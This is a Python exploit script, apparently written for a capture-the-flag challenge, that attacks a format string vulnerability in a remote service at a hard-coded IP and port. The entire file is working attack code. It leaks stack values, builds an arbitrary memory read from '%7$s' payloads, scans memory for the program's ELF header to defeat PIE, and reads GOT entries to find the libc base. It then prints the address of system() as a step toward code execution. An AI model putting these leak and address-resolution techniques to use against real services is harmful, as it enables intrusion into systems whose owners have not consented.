#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.05)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)
def get_pie(s):
    a15=leak_lld(s,15); start=a15&~0xfff
    for d in range(0,0x20000,0x1000):
        X=start-d; r=readmem(s,X)
        if r.startswith(b'\x7fELF'): return X
    return None

s=newconn()
pie=get_pie(s)
# leak libc GOT entries
libc_addrs=[]
for off in range(0x3f90, 0x4040, 8):
    X=pie+off
    r=readmem(s,X)
    strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
    if strb and len(strb)==6 and strb[-1]==0x7b:  # ends in 0x7b -> 0x7b.. libc addr
        val=int.from_bytes(strb+b'\x00\x00','little')
        libc_addrs.append((off,val))
print("libc got:", [(hex(o),hex(v)) for o,v in libc_addrs])
if libc_addrs:
    lowest=min(v for _,v in libc_addrs)
    # scan down for libc ELF header
    start=lowest & ~0xfff
    libc_base=None
    for d in range(0, 0x300000, 0x1000):
        X=start-d
        r=readmem(s,X)
        if r.startswith(b'\x7fELF'):
            libc_base=X; break
        if d%0x40000==0: print(" ...",hex(X))
    print("libc_base=",hex(libc_base))
    if libc_base:
        print("system=0x%x"%(libc_base+0x50d70))
s.close()
